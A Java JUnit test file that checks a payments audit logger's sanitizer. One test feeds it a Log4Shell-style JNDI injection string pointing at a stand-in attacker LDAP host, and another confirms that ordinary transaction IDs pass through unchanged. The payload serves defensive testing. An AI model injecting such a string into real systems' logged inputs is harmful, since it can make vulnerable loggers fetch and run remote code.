package com.payments.service;

import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.DisplayName;
import static org.junit.jupiter.api.Assertions.*;

public class PaymentAuditLoggerTest {

    @Test
    @DisplayName("Verify JNDI exploit injection payload is safely neutralized")
    public void testNeutralizeJndiExploitString() {
        String exploitPayload = "${jndi:ldap://malicious-attacker.corp/exploit}";
        String sanitized = PaymentAuditLogger.sanitizeLogContext(exploitPayload);
        assertFalse(sanitized.contains("${jndi"), "Payload must not contain JNDI expansion token");
        PaymentAuditLogger logger = new PaymentAuditLogger();
        assertDoesNotThrow(() -> logger.logTransaction(sanitized));
    }

    @Test
    @DisplayName("Verify normal alphanumeric transaction IDs are preserved")
    public void testPreserveValidTransaction() {
        String validId = "TXN_98234-ALPHA.2026";
        String sanitized = PaymentAuditLogger.sanitizeLogContext(validId);
        assertEquals(validId, sanitized);
    }
}
